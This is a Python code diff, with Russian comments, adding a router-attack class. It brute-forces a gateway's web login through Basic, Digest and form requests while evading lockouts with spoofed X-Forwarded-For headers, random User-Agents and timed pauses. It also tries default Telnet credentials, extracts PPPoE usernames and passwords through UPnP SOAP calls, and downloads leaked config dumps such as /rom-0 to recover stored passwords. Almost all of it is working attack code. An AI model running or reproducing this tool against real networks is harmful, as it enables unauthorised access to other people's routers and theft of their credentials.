+        passes = self._parse_csv(self.custom_passes_text)
+        for u in users:
+            push(u, "")
+        for i in range(min(len(users), len(passes))):
+            push(users[i], passes[i])
+
+        if self.mode != "basic":
+            for u in USER_DICT:
+                for p in PASS_DICT:
+                    push(u, p)
+
+        return result
+
+    # ------------------- Разведка и детекты -------------------
+
+    def detect_brand_from_page(self, title, server_header, body_lower):
+        combined = "{} {} {}".format(title, server_header, body_lower).lower()
+        best_name = "Generic"
+        best_score = 0
+        for name, keys in BRAND_SIGNATURES.items():
+            score = 0
+            for key in keys:
+                if key in combined:
+                    score += 1
+            if score > best_score:
+                best_score = score
+                best_name = name
+        return best_name
+
+    def parse_title(self, html):
+        match = re.search(r"<title>(.*?)</title>", html, re.IGNORECASE | re.DOTALL)
+        if match:
+            return re.sub(r"\s+", " ", match.group(1)).strip()
+        return ""
+
+    def extract_server_header(self, response):
+        lowered = response.lower()
+        idx = lowered.find("server:")
+        if idx < 0:
+            return ""
+        end = lowered.find("\n", idx)
+        if end < 0:
+            end = min(len(response), idx + 120)
+        parts = response[idx:end].split(":", 1)
+        return parts[1].strip() if len(parts) > 1 else ""
+
+    def extract_realm(self, response):
+        www = self.extract_www_authenticate(response)
+        if not www:
+            return ""
+        # снимаем кавычки с обеих сторон и берём именно значение realm=
+        m = re.search(r'realm\s*=\s*"([^"]*)"', www)
+        if m:
+            return m.group(1)
+        m = re.search(r'realm\s*=\s*([^\s,]+)', www)
+        return m.group(1).strip() if m else ""
+
+    def extract_www_authenticate(self, response):
+        lowered = response.lower()
+        idx = lowered.find("www-authenticate:")
+        if idx < 0:
+            return ""
+        end = response.find("\n", idx)
+        if end < 0:
+            end = len(response)
+        return response[idx:end].split(":", 1)[-1].strip()
+
+    def _clean_form_action(self, action):
+        action = str(action or "").strip()
+        if action.lower().startswith("http"):
+            slash_idx = action.find("/", action.find("//") + 2)
+            action = action[slash_idx:] if slash_idx >= 0 else "/"
+        # убираем любые пробельные символы/переводы строк — они разрывают request line
+        action = "".join(action.split())
+        if action and not action.startswith("/"):
+            action = "/" + action
+        return action
+
+    def find_form_action(self, html):
+        # предпочитаем форму с password-полем: первая форма на странице бывает поиск/логаут
+        blocks = re.findall(r"<form\b.*?</form>", html, re.IGNORECASE | re.DOTALL)
+        fallback = ""
+        for block in blocks:
+            match = re.search(r"action\s*=\s*[\"']([^\"']+)[\"']", block, re.IGNORECASE)
+            if not match:
+                continue
+            action = self._clean_form_action(match.group(1))
+            if not action:
+                continue
+            if any(marker in block.lower() for marker in LOGIN_PASSWORD_INPUT_MARKERS):
+                return action
+            if not fallback:
+                fallback = action
+        match = re.search(r"<form[^>]*action\s*=\s*[\"']([^\"']+)[\"']", html, re.IGNORECASE)
+        if match:
+            action = self._clean_form_action(match.group(1))
+            if action:
+                return action
+        return fallback
+
+    def fetch_realms_dictionary(self, realm):
+        low = realm.lower()
+        for key in sorted(CREDS_BY_REALM.keys(), key=len, reverse=True):
+            if key in low:
+                self._log("Realm '{}': применяю дефолты категории '{}' первыми".format(realm, key), "SCAN")
+                return CREDS_BY_REALM[key]
+        return []
+
+    def _get_wifi_info(self):
+        ssid = None
+        ip = None
+        is_wifi = False
+        ssid_from_api = False
+        try:
+            device_json = self.api.getDevice()
+            data = json.loads(str(device_json)) if isinstance(device_json, str) else device_json
+            if isinstance(data, dict):
+                wifi = data.get("wifi", {}) or data.get("network", {}).get("wifi", {})
+                raw_ssid = wifi.get("ssid") or wifi.get("name") or wifi.get("SSID")
+                raw_ip = wifi.get("ip") or wifi.get("IP") or wifi.get("address")
+                if raw_ssid and str(raw_ssid).strip() not in ["<unknown ssid>", "0x", "", "null", "None"]:
+                    ssid = str(raw_ssid).strip()
+                    self._device_ssid = ssid
+                    ssid_from_api = True
+                    is_wifi = True
+                if raw_ip and str(raw_ip).strip() not in ["", "null", "None"]:
+                    ip = str(raw_ip).strip()
+        except Exception:
+            pass
+        if not ip or ip in ["—", "127.0.0.1"]:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.settimeout(0.4)
+                s.connect(("8.8.8.8", 80))
+                ip = s.getsockname()[0]
+                self._safe_close_socket(s)
+            except Exception:
+                ip = None
+        if ip and ip != getattr(self, "_last_seen_ip", ""):
+            # сменилась сеть — прошлый SSID протух, сбрасываем только если
+            # API в этом вызове не дал свежего SSID
+            if not ssid_from_api:
+                self._device_ssid = ""
+        self._last_seen_ip = ip or ""
+        if ip:
+            if ip.startswith("198.18."):
+                ssid = "VPN Fake-IP (не Wi-Fi)"
+                is_wifi = False
+            elif ip.startswith("192.168."):
+                is_wifi = True
+                if not ssid:
+                    ssid = "Wi-Fi (LAN)"
+            elif ip.startswith("100.") or (ip.startswith("10.") and not is_wifi):
+                if not ssid:
+                    ssid = "Мобильная сеть / VPN"
+            else:
+                if not ssid:
+                    ssid = "Подключено (Wi-Fi/LAN)"
+                    is_wifi = True
+        else:
+            ssid = "Wi-Fi не подключён"
+        return ssid, ip or "—", is_wifi
+
+    def _detect_vpn(self):
+        now = time.time()
+        if self._cached_vpn is not None and (now - self._cached_vpn_time) < 15.0:
+            return self._cached_vpn
+        ssid, ip, _ = self._get_wifi_info()
+        device_ssid = getattr(self, "_device_ssid", "") or ""
+        vpn_active = bool(ip.startswith("198.18.") or ("vpn" in device_ssid.lower()))
+        self._cached_vpn = vpn_active
+        self._cached_vpn_time = now
+        return vpn_active
+
+    # ------------------- HTTP ядро с обходом детекта -------------------
+
+    def http_request(self, host, port, method, path, body=None, auth_token=None, timeout=4.0, evade=True):
+        user_agent = generate_random_user_agent() if (evade and self.evasion_ua) else "Mozilla/5.0"
+        headers = [
+            "{} {} HTTP/1.1".format(method, path),
+            "Host: {}:{}".format(host, port),
+            "User-Agent: {}".format(user_agent),
+            "Connection: close"
+        ]
+        if evade and self.evasion_xff:
+            fake_ip = "192.168.{}.{}".format(random.randint(0, 255), random.randint(2, 254))
+            headers.append("X-Forwarded-For: {}".format(fake_ip))
+        if auth_token:
+            # base64-токен без пробелов => Basic; значение со схемой (Digest ...) проходит как есть
+            if " " in str(auth_token):
+                headers.append("Authorization: {}".format(auth_token))
+            else:
+                headers.append("Authorization: Basic {}".format(auth_token))
+        if body is not None:
+            headers.append("Content-Type: application/x-www-form-urlencoded")
+            headers.append("Content-Length: {}".format(len(body)))
+        payload = ("\r\n".join(headers) + "\r\n\r\n").encode("utf-8")
+        if body is not None:
+            payload += body.encode("utf-8")
+
+        sock = None
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(timeout)
+            sock.connect((host, port))
+            if port == 443:
+                sock = _tls_context().wrap_socket(sock, server_hostname=host)
+            sock.sendall(payload)
+            response = b""
+            # общий дедлайн на весь приём: медленный/хитрый сервер не должен
+            # растягивать одну попытку на несколько таймаутов подряд
+            deadline = time.time() + timeout
+            while len(response) < 65536:
+                remaining = deadline - time.time()
+                if remaining <= 0:
+                    break
+                sock.settimeout(min(remaining, 1.0))
+                try:
+                    chunk = sock.recv(8192)
+                except socket.timeout:
+                    continue
+                if not chunk:
+                    break
+                response += chunk
+            if b"transfer-encoding: chunked" in response.lower():
+                bsep = response.find(b"\r\n\r\n")
+                if bsep >= 0:
+                    response = response[:bsep + 4] + decode_chunked_body(response[bsep + 4:])
+            # latin-1 обратимо кодируется назад в байты — нужно для парсинга rom-0
+            text = response.decode("latin-1", errors="replace")
+            head_line = text.split("\n", 1)[0].strip()
+            try:
+                status_code = int(head_line.split(" ")[1])
+            except Exception:
+                status_code = 0
+            location = ""
+            low = text.lower()
+            idx = low.find("location:")
+            if idx >= 0:
+                end = text.find("\n", idx)
+                if end < 0:
+                    end = min(len(text), idx + 120)
+                location = text[idx:end].split(":", 1)[1].strip()
+            has_cookie = "set-cookie:" in low
+            sep = text.find("\r\n\r\n")
+            body_text = text[sep + 4:] if sep >= 0 else ""
+            return status_code, location, has_cookie, body_text, text
+        except Exception as exc:
+            return -1, "", False, "", "socket error: {}".format(exc)
+        finally:
+            self._safe_close_socket(sock)
+
+    def _jitter_sleep(self):
+        base_ms = self.attempt_delay_ms
+        if base_ms <= 0:
+            return
+        low_ms = base_ms * 0.5
+        high_ms = base_ms * 1.5
+        time.sleep(random.uniform(low_ms, high_ms) / 1000.0)
+
+    def _wait_out_cooldown(self):
+        while not self.stop_flag and not (self.found_flag and self.stop_on_success):
+            now = time.time()
+            if now >= self._cooldown_until:
+                return
+            time.sleep(min(0.2, max(0.05, self._cooldown_until - now)))
+
+    def _register_lockout_signal(self):
+        with self.stats_lock:
+            self._consec_lockouts += 1
+            streak = self._consec_lockouts
+        if streak >= LOCKOUT_THRESHOLD and self.lockout_pause_s > 0:
+            with self.stats_lock:
+                if self._consec_lockouts >= LOCKOUT_THRESHOLD:
+                    self._consec_lockouts = 0
+                    self._cooldown_until = time.time() + float(self.lockout_pause_s)
+                    self.evade_pauses += 1
+                    should_log = True
+                else:
+                    should_log = False
+            if should_log:
+                self._log("🥷 Роутер начал блокировать (серия 403/429). Пауза {} сек, потом продолжаю".format(
+                    self.lockout_pause_s
+                ), "EVADE")
+
+    def _reset_lockout_streak(self):
+        with self.stats_lock:
+            self._consec_lockouts = 0
+
+    def _apply_retry_after(self, full_text):
+        # заголовок Retry-After: роутер сам говорит паузу — нельзя долбить дальше
+        ra = extract_retry_after(full_text)
+        if ra > 0:
+            with self.stats_lock:
+                self._cooldown_until = max(self._cooldown_until, time.time() + ra)
+            self._log("Роутер просит паузу (Retry-After: {} сек) — соблюдаю".format(ra), "EVADE")
+
+    def _register_netfail_signal(self):
+        # серия полных сетевых сбоев: роутер/файрвол начал дропать наши пакеты
+        with self.stats_lock:
+            self._consec_netfail += 1
+            streak = self._consec_netfail
+        if streak >= NETFAIL_THRESHOLD:
+            with self.stats_lock:
+                self._consec_netfail = 0
+                self._cooldown_until = max(self._cooldown_until, time.time() + NETFAIL_PAUSE_S)
+                self.evade_pauses += 1
+            self._log("🛑 {} попыток без ответа подряд — похоже, роутер отрезал нас (IP-бан). Пауза {} сек".format(
+                NETFAIL_THRESHOLD, NETFAIL_PAUSE_S
+            ), "EVADE")
+
+    def _reset_netfail_streak(self):
+        with self.stats_lock:
+            self._consec_netfail = 0
+
+    def _looks_like_login_page(self, body):
+        low = (body or "").lower()
+        has_password_input = any(marker in low for marker in LOGIN_PASSWORD_INPUT_MARKERS)
+        logged_in_marker_present = any(marker in low for marker in LOGGED_IN_MARKERS)
+        return has_password_input and not logged_in_marker_present
+
+    def _normalize_page_sample(self, text):
+        # нормализуем страницу: убираем цифры (nonce/счётчики) и пробелы
+        return re.sub(r"\s+", " ", re.sub(r"[0-9]", "", str(text or ""))).strip()[:400]
+
+    def _verify_http_hit(self, host, port, method, path, form_body, auth_value, timeout, body):
+        # двойная проверка: некоторые панели отдают одну и ту же страницу
+        # с кодом 200 НЕСКОЛЬКИМ паролям или даже любому (JS-логин).
+        # Контроль — запрос с ЗАВЕДОМО неверными кредами: если мусорный
+        # пароль получает ту же страницу, найденный хит фейковый.
+        # (Анонимный GET недостаточен: панель может анониму отдавать 401,
+        # а любому непустому паролю — 200.)
+        text = body or ""
+        try:
+            if form_body is not None:
+                # форма: контроль должен повторять путь, метод и поля логина —
+                # иначе роутер отличит контроль от перебора
+                control = build_form_body("__netaudit_probe__", "__definitely_wrong__", getattr(self, "_form_fields", None))
+                c_status, c_loc, _ck, c_body, _full = self.http_request(
+                    host, port, "POST", path or "/", control, None, timeout, evade=False
+                )
+            else:
+                c_status, c_loc, _ck, c_body, _full = self.http_request(
+                    host, port, "GET", "/", None,
+                    generate_basic_token("__netaudit_probe__", "__definitely_wrong__"),
+                    timeout, evade=False
+                )
+        except Exception:
+            return True
+        if c_status in (401, 403):
+            # честная проверка авторизации: неверный пароль отвергнут, верим хиту
+            return True
+        c_text = c_body or ""
+        c_low = c_text.lower()
+        rejected_page = (
+            self._looks_like_login_page(c_text)
+            or any(m in c_low for m in ("invalid", "неверн", "ошибк", "wrong", "denied", "unauthorized", "failed"))
+        )
+        if self._normalize_page_sample(c_body) == self._normalize_page_sample(text):
+            # любые креды дают одну и ту же страницу — фейк
+            return False
+        if rejected_page:
+            # неверные creds показали логин/ошибку — настоящий reject, хит настоящий
+            return True
+        c_loc_l = (c_loc or "").lower()
+        if 300 <= c_status < 400 and ("login" in c_loc_l or "error" in c_loc_l or "auth" in c_loc_l):
+            return True
+        if c_status <= 0 or c_status >= 400:
+            # контроль ведёт себя странно (404/5xx/сбой) — выводов не делаем
+            return True
+        # на неверные креды сервер дал постороннюю страницу: ведёт себя
+        # так же, как на «хите», — не различает пароли, считаем фейком
+        return False
+
+    def judge_response(self, status_code, location, body):
+        if status_code == 401:
+            return "fail"
+        if status_code in (403, 429):
+            # OpenWrt/LuCI отдаёт незалогиненному 403 с формой входа:
+            # это «не вошёл», а не бан — иначе кулдаун-автомат сломается
+            if self._looks_like_login_page(body or ""):
+                return "fail"
+            return "lockout"
+        if status_code == 200:
+            text = body or ""
+            if re.search(r'(?i)http-equiv\s*=\s*["\']?refresh[^>]*url\s*=', text):
+                # страница-автопереход на путь входа — не дашборд
+                return "fail"
+            if self._looks_like_login_page(text):
+                return "fail"
+            compact = text.strip()
+            if not compact:
+                return "fail"
+            # пустые и безразметные тела не превращаем в ложный хит:
+            # нужны признаки HTML/JSON либо явный маркер авторизации
+            strong_markup = ("<" in compact) or ("{" in compact)
+            strong_marker = any(m in compact.lower() for m in LOGGED_IN_MARKERS)
+            if not (strong_markup or strong_marker):
+                return "fail"
+            return "hit"
+        if 300 <= status_code < 400:
+            # редирект на смену схемы http→https (nginx бы постоянно отдаёт
+            # 302 на https://host/) — не «доступ получен», а приглашение к TLS.
+            # Смотрим путь без хоста: пустой путь или "/" = служебный редирект.
+            raw = location or ""
+            path_part = raw
+            if "://" in raw:
+                try:
+                    path_part = urllib.parse.urlsplit(raw).path or "/"
+                except Exception:
+                    path_part = "/"
+            loc = path_part.lower()
+            if not loc or loc == "/":
+                return "fail"
+            if "login" in loc or "error" in loc or "auth" in loc:
+                return "fail"
+            return "hit"
+        return "fail"
+
+    # ------------------- Воркеры -------------------
+
+    def worker_loop(self, worker_id, candidates, attack_mode, form_path):
+        host = self.gateway
+        port = self.port
+        timeout = float(self.timeout_seconds)
+        form_path = form_path or "/"
+        halt_on_found = bool(self.stop_on_success)
+        continue_after_hit = not halt_on_found
+        gen = self._run_gen
+
+        while not self.stop_flag and (not self.found_flag or continue_after_hit):
+            if gen != self._run_gen:
+                break
+            try:
+                self._wait_out_cooldown()
+                if gen != self._run_gen:
+                    break
+                if self.stop_flag or (self.found_flag and halt_on_found):
+                    break
+
+                with self._cursor_lock:
+                    # проверяем поколение ещё раз ПОД замком: иначе воркер,
+                    # уснувший на таймауте, мог бы украсть пару нового прогона
+                    if gen != self._run_gen:
+                        break
+                    pos = self._cursor
+                    if pos >= len(candidates):
+                        break
+                    self._cursor += 1
+
+                username, password = candidates[pos]
+
+                got_hit = False
+                hit_mode = attack_mode
+                lockout_seen = False
+                try_full_text = ""
+
+                if attack_mode in ("basic", "auto"):
+                    self._jitter_sleep()
+                    if self.auth_scheme == "digest":
+                        # Digest: анонимный GET выдаёт свежий nonce, второй запрос подписываем
+                        _s0, _loc0, _ck0, _b0, full0 = self.http_request(
+                            host, port, "GET", "/", None, None, timeout
+                        )
+                        www0 = self.extract_www_authenticate(full0)
+                        fresh = parse_digest_challenge(www0) if www0.lower().startswith("digest") else {}
+                        params = fresh if fresh.get("nonce") else (
+                            self.digest_params if self.digest_params and self.digest_params.get("nonce") else None
+                        )
+                        if params:
+                            auth_value = build_digest_header(params, username, password, "GET", "/")
+                        else:
+                            # нет nonce — Digest недоступен, пытаемся как Basic
+                            auth_value = generate_basic_token(username, password)
+                    else:
+                        auth_value = generate_basic_token(username, password)
+                    status_code, location, _, body, try_full_text = self.http_request(
+                        host, port, "GET", "/", None, auth_value, timeout
+                    )
+                    verdict = self.judge_response(status_code, location, body)
+                    if verdict == "hit" and self._verify_http_hit(host, port, "GET", "/", None, auth_value, timeout, body):
+                        got_hit = True
+                        hit_mode = "digest" if (self.auth_scheme == "digest" and auth_value.startswith("Digest")) else "basic"
+                    elif verdict == "lockout":
+                        lockout_seen = True
+                    elif attack_mode == "auto":
+                        self._jitter_sleep()
+                        f_status, f_loc, _, f_body, f_txt = self.http_request(
+                            host, port, "POST", form_path, build_form_body(username, password, getattr(self, "_form_fields", None)), None, timeout
+                        )
+                        f_verdict = self.judge_response(f_status, f_loc, f_body)
+                        if f_verdict == "hit" and self._verify_http_hit(
+                            host, port, "POST", form_path, build_form_body(username, password, getattr(self, "_form_fields", None)), None, timeout, f_body
+                        ):
+                            got_hit = True
+                            hit_mode = "form"
+                        elif f_verdict == "lockout":
+                            lockout_seen = True
+                            try_full_text = f_txt
+                else:
+                    self._jitter_sleep()
+                    f_status, f_loc, _, f_body, f_txt = self.http_request(
+                        host, port, "POST", form_path, build_form_body(username, password, getattr(self, "_form_fields", None)), None, timeout
+                    )
+                    f_verdict = self.judge_response(f_status, f_loc, f_body)
+                    if f_verdict == "hit" and self._verify_http_hit(
+                        host, port, "POST", form_path, build_form_body(username, password, getattr(self, "_form_fields", None)), None, timeout, f_body
+                    ):
+                        got_hit = True
+                        hit_mode = "form"
+                    elif f_verdict == "lockout":
+                        lockout_seen = True
+                        try_full_text = f_txt
+
+                with self.stats_lock:
+                    self.tried_count += 1
+                    if got_hit:
+                        # поколение проверяем и здесь: воркер старого прогона,
+                        # дошумевший в socket-таймауте, не должен перетереть
+                        # свежие found_creds нового запуска
+                        if not self.found_flag and gen == self._run_gen:
+                            self.found_creds = (username, password, hit_mode)
+                            self.found_flag = True
+                            self._log("Пароль найден! Логин '{}' Пароль '{}' (через {})".format(
+                                username if username else "(пусто)",
+                                password if password else "(пусто)",
+                                AUTH_MODE_LABELS.get(hit_mode, "HTML-форма POST")
+                            ), "HIT")
+                            if halt_on_found:
+                                self.stop_flag = True
+                    elif lockout_seen:
+                        self.lockout_count += 1
+                    else:
+                        self.fail_count += 1
+
+                if lockout_seen:
+                    # Retry-After из ответа (429/503) важнее внутренних ритуалов
+                    self._apply_retry_after(try_full_text)
+                    self._register_lockout_signal()
+                else:
+                    self._reset_lockout_streak()
+
+                if attack_mode == "auto":
+                    net_fail = status_code <= 0 and f_status <= 0
+                elif attack_mode in ("basic",):
+                    net_fail = status_code <= 0
+                else:
+                    net_fail = f_status <= 0
+                if net_fail:
+                    self._register_netfail_signal()
+                else:
+                    self._reset_netfail_streak()
+
+                if halt_on_found and self.found_flag:
+                    break
+            except Exception as exc:
+                # воркер не должен умирать молча: подвесили бы весь перебор
+                try:
+                    with self.stats_lock:
+                        self.fail_count += 1
+                    self._log("Воркер {}: ошибка попытки: {}".format(worker_id, exc), "ERR")
+                except Exception:
+                    pass
+
+        if worker_id == 0:
+            self.brute_done = True
+
+    # ------------------- Телнет и UPnP -------------------
+
+    def _read_telnet_until(self, sock, markers, timeout=3.0):
+        buf = bytearray()
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            leftover = min(0.5, max(0.05, deadline - time.time()))
+            sock.settimeout(leftover)
+            try:
+                chunk = sock.recv(1024)
+            except socket.timeout:
+                # тишина до общего дедлайна не повод сдаваться сразу
+                continue
+            except Exception:
+                break
+            if not chunk:
+                break
+            buf += strip_telnet_iacs(chunk)
+            tail = bytes(buf[-64:]).decode("latin-1", errors="replace").lower()
+            if any(m in tail for m in markers):
+                break
+        return bytes(buf)
+
+    def telnet_try_login(self, host, username, password, port=23, timeout=4.0):
+        s = None
+        try:
+            s = socket.create_connection((host, port), timeout=timeout)
+            banner_buf = self._read_telnet_until(s, TELNET_LOGIN_MARKERS, timeout)
+            banner = banner_buf.decode("latin-1", errors="replace").strip()
+            s.sendall(("{}\r\n".format(username)).encode("latin-1", errors="replace"))
+            pass_buf = self._read_telnet_until(s, TELNET_PASS_MARKERS + TELNET_LOGIN_MARKERS, timeout)
+            pass_tail = pass_buf.decode("latin-1", errors="replace").lower()
+            if any(m in pass_tail for m in TELNET_LOGIN_MARKERS) and not any(m in pass_tail for m in TELNET_PASS_MARKERS):
+                # снова логин — bad user
+                return False, banner, "login_reprompt"
+            s.sendall(("{}\r\n".format(password)).encode("latin-1", errors="replace"))
+            final_buf = self._read_telnet_until(s, ("#", ">", "$", "]"), min(3.0, timeout))
+            reply = final_buf.decode("latin-1", errors="replace")
+            verdict = classify_telnet_reply(reply)
+            if verdict == "success":
+                return True, banner, reply.strip()[:80]
+            return False, banner, reply.strip()[:80]
+        except Exception as exc:
+            return False, "", "conn_error: {}".format(exc)
+        finally:
+            self._safe_close_socket(s)
+
+    def _probe_telnet(self):
+        host = self.gateway
+        if not host or "." not in host:
+            return
+        if self.running:
+            # не мешаем активному брутфорсу лишними соединениями
+            self._log("Telnet-пропуск: подбор уже идёт", "SCAN")
+            return
+        for user, passwd in TELNET_CREDS:
+            if self.stop_flag:
+                break
+            ok, banner, note = self.telnet_try_login(host, user, passwd, 23, min(3.0, float(self.timeout_seconds)))
+            if ok:
+                self._log("🎉 Telnet {}:{}: вход '{}'/'{}' успешен (баннер: {})".format(
+                    host, 23, user, passwd, (banner or "-")[:40]), "HIT")
+                self.telnet_creds = (user, passwd)
+                self._cross_apply_telnet_creds(user, passwd)
+                return
+            if note == "conn_error":
+                self._log("Telnet {}: порт закрыт или фильтр".format(host), "SCAN")
+                return
+        self._log("Telnet: словарь отработал без успеха", "SCAN")
+
+    def _cross_apply_telnet_creds(self, user, passwd):
+        # креды Telnet часто совпадают с веб-админкой — одна проверка, не брутфорс
+        if self.running:
+            return
+        gen_snapshot = self._run_gen
+        try:
+            status_code, location, _, body, _ = self.http_request(
+                self.gateway, self.port, "GET", "/", None,
+                generate_basic_token(user, passwd), float(self.timeout_seconds)
+            )
+            if self.judge_response(status_code, location, body) == "hit" and self._verify_http_hit(
+                self.gateway, self.port, "GET", "/", None,
+                generate_basic_token(user, passwd), float(self.timeout_seconds), body
+            ):
+                self._log("Креды Telnet подходят к веб-панели {}:{}!".format(self.gateway, self.port), "HIT")
+                with self.stats_lock:
+                    if not self.found_creds and self._run_gen == gen_snapshot:
+                        self.found_creds = (user, passwd, "basic")
+                        self.found_flag = True
+        except Exception:
+            pass
+
+    def probe_upnp_credentials(self, port=1900, timeout=1.5):
+        # WANPPPConnection.GetUserName/GetPassword через una-broadcast SOAP отдаёт PPPoE-учётку
+        soap = (
+            '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
+            '<s:Body><u:GetPPPAuthenticationCredentials '
+            'xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"></u:GetPPPAuthenticationCredentials>'
+            '</s:Body></s:Envelope>'
+        )
+        pkt_tpl = (
+            "POST /ctl/IPConn HTTP/1.1\r\nHost: {}:{}\r\nSOAPACTION: \"urn:schemas-upnp-org:service:"
+            "WANPPPConnection:1#GetPPPAuthenticationCredentials\"\r\nContent-Type: text/xml\r\n"
+            "Content-Length: {}\r\nConnection: close\r\n\r\n{}"
+        )
+        sock = None
+        got = []
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(timeout)
+            packet = pkt_tpl.format(self.gateway, port, len(soap), soap)
+            sock.sendto(packet.encode("utf-8"), (self.gateway, port))
+            while True:
+                data, _addr = sock.recvfrom(8192)
+                if not data:
+                    break
+                text = data.decode("utf-8", errors="replace")
+                user = re.search(r"<NewUsername>(.*?)</NewUsername>", text, re.DOTALL | re.IGNORECASE)
+                passw = re.search(r"<NewPassword>(.*?)</NewPassword>", text, re.DOTALL | re.IGNORECASE)
+                if user or passw:
+                    user_v = user.group(1).strip() if user else ""
+                    pass_v = passw.group(1).strip() if passw else ""
+                    got.append((user_v, pass_v))
+                    break
+        except Exception:
+            pass
+        finally:
+            self._safe_close_socket(sock)
+        return got
+
+    def _probe_leaked_configs(self):
+        # пробуем скачать конфиг и вытащить пароли из дампа
+        if self.running:
+            self._log("Проверка конфигов пропущена: подбор занял сеть", "SCAN")
+            return
+        for route in ("/rom-0", "/backup_settings_2.xml"):
+            if self.stop_flag:
+                return
+            try:
+                status_code, _, _, _body, full_text = self.http_request(
+                    self.gateway, self.port, "GET", route, None, None,
+                    float(self.timeout_seconds), evade=False
+                )
+            except Exception:
+                continue
+            if status_code != 200 or not full_text:
+                continue
+            sep = full_text.find("\r\n\r\n")
+            raw = full_text[sep + 4:].encode("latin-1", errors="replace") if sep >= 0 else b""
+            leaked = decode_rom0_secrets(raw)
+            if not leaked:
+                user_v, pass_v = extract_pppoe_credentials(full_text[sep + 4:] if sep >= 0 else "")
+                if user_v and pass_v:
+                    leaked = [(user_v, pass_v)]
+            if leaked:
+                for lv_u, lv_p in leaked[:3]:
+                    self._log("Утёкшие данные из {}: логин '{}' пароль '{}'".format(route, lv_u, lv_p), "VULN")
+                    if not self.found_creds:
+                        self.vulns_found.append("Учётка из {}: {} / {}".format(route, lv_u, lv_p))
+
+    # ------------------- Пробы уязвимостей -------------------
+
+    def simple_probe(self, path):
+        status_code, _, _, body, _ = self.http_request(
+            self.gateway, self.port, "GET", path, None, None, float(self.timeout_seconds), evade=False
+        )
+        return status_code, body
+
+    def probe_vulnerabilities(self):
+        # защита от параллельного запуска: две пробы стирают list друг друга
+        if getattr(self, "_probing", False):
+            self._log("Проба уязвимостей уже идёт — подождите её окончания", "INFO")
+            return
+        self._probing = True
+        try:
+            self._do_probe_vulnerabilities()
+        finally:
+            self._probing = False
+
+    def _do_probe_vulnerabilities(self):
+        self.vulns_found = []
+
+        for route, description in KNOWN_ROUTES:
+            status_code, body = self.simple_probe(route)
+            if status_code in (200, 206) and body and len(body.strip()) > 30:
+                self.vulns_found.append("{} — {}".format(route, description))
+                self._log("Открыт без логина: {}".format(route), "VULN")
+
+        soap_body = (
+            '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
+            's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
+            '<u:GetStatusInfo xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"></u:GetStatusInfo>'
+            '</s:Body></s:Envelope>'
+        )
+        upnp_packet = (
+            "POST /ctl/IPConn HTTP/1.1\r\nHost: {}:1900\r\n"
+            "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#GetStatusInfo\"\r\n"
+            "Content-Type: text/xml\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}"
+        ).format(self.gateway, len(soap_body), soap_body)
+        udp_sock = None
+        try:
+            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            udp_sock.settimeout(2.0)
+            udp_sock.sendto(upnp_packet.encode("utf-8"), (self.gateway, 1900))
+            data, _ = udp_sock.recvfrom(4096)
+            if data:
+                self.vulns_found.append("UPnP (порт 1900) отвечает любому запросу — наружу торчит WAN-статус")
+                self._log("UPnP отвечает без ограничений", "VULN")
+        except Exception:
+            pass
+        finally:
+            self._safe_close_socket(udp_sock)
+
+        telnet_sock = None
+        try:
+            telnet_sock = socket.create_connection((self.gateway, 23), timeout=min(2.0, float(self.timeout_seconds)))
+            banner = telnet_sock.recv(512)
+            telnet_sock.close()
+            if banner:
+                decoded = banner.decode("latin-1", errors="replace").strip().replace("\n", " ").replace("\r", "")
+                self.vulns_found.append("Telnet (порт 23) открыт, баннер: '{}' — тот же словарь может подойти".format(decoded[:60]))
+                self._log("Telnet открыт с баннером: {}".format(decoded[:60]), "VULN")
+        except Exception:
+            pass
+        finally:
+            if telnet_sock is not None:
+                self._safe_close_socket(telnet_sock)
+
+        upnp_creds = self.probe_upnp_credentials()
+        if upnp_creds:
+            for lu, lp in upnp_creds:
+                self._log("UPnP раскрыл PPPoE-учётку: '{}' / '{}'".format(lu, lp), "VULN")
+                self.vulns_found.append("PPPoE-учётка через UPnP: {} / {}".format(lu, lp))
+
+        self._probe_telnet()
+        self._probe_leaked_configs()
+
+        if not self.vulns_found:
+            self._log("Известных открытых точек не найдено (фильтр MAC или пропатченная прошивка)", "INFO")
+        self.refresh()
+
+    # ------------------- Таймер UI -------------------
+
+    def _finalize_run_summary(self, outcome):
+        # одна сводка на прогон: скорость, длительность, попытки
+        if getattr(self, "last_run_summary", None) is not None:
+            return
+        elapsed = time.time() - getattr(self, "_brute_started_ts", 0.0)
+        if elapsed <= 0:
+            elapsed = 0.1
+        avg_pps = int(self.tried_count / elapsed) if (self.tried_count and elapsed > 0) else 0
+        self.last_run_summary = {
+            "attempts": self.tried_count,
+            "duration_s": max(1, int(round(elapsed))),
+            "avg_pps": avg_pps,
+            "outcome": outcome,
+        }
+
+    def _ui_progress_timer(self):
+        gen = getattr(self, "_run_gen", 0)
+        last_total = 0
+        last_time = time.time()
+        while self.running and not self.stop_flag and gen == self._run_gen:
+            time.sleep(0.5)
+            if gen != self._run_gen:
+                return
+            now = time.time()
+            dt = now - last_time
+            last_time = now
+            with self.stats_lock:
+                current = self.tried_count
+            if dt > 0:
+                self.pps = int((current - last_total) / dt)
+                last_total = current
+            if current >= self.expected_total and not self.found_flag:
+                break
+            with self._cursor_lock:
+                exhausted = self._cursor >= self.expected_total
+            if exhausted or self.brute_done or self.found_flag:
+                break
+            self.refresh()
+        if gen != getattr(self, "_run_gen", gen):
+            return
+        if self.found_creds:
+            self.running = False
+            self.status_line = "Готово! Доступ получен, смотрите плашку выше."
+            self._finalize_run_summary("success")
+        elif not self.stop_flag or self.tried_count >= self.expected_total:
+            self.running = False
+            self.status_line = "Список исчерпан — пароль не найден. Запустите «Только уязвимости»."
+            self._log("Перебор завершён: словарь исчерпан без успеха", "WARN")
+            self._finalize_run_summary("exhausted")
